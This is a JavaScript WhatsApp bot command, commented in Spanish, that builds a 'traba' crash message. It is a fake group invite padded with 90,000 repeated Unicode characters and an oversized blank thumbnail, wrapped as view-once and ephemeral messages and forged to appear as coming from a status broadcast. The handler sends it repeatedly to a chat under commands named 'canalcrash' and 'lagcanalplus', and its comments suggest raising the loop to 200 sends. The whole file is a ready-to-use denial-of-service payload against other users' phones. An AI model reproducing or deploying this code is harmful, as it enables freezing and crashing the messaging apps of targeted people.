let handler = async (m, { conn }) => {
  // Solo el número vinculado al bot puede usar el comando
  if (m.sender !== conn.user.id) return m.reply(`❌ *SOLO EL BOT PUEDE USAR ESTE COMANDO*`);

  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Cambia esto si deseas usar otro canal
  const thumbnailFake = Buffer.alloc(90000);

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const wrappedViewOnce = {
    viewOnceMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  const wrappedEphemeral = {
    ephemeralMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  // Puedes repetir esto varias veces si quieres hacerlo más fuerte
  for (let i = 0; i < 5; i++) { // Cámbialo a 200 si quieres que sea 200 veces
    await conn.relayMessage(
      m.chat,
      {
        forward: {
          key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
          },
          message: wrappedViewOnce
        }
      },
      { messageId: generateMessageID() }
    );

    await conn.relayMessage(
      m.chat,
      {
        forward: {
          key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
          },
          message: wrappedEphemeral
        }
      },
      { messageId: generateMessageID() }
    );
  }

  m.reply('✅ *Traba canal enviada por el bot correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;

// Función auxiliar si no la tienes
function generateMessageID() {
  return Math.random().toString(36).substring(2, 15);
}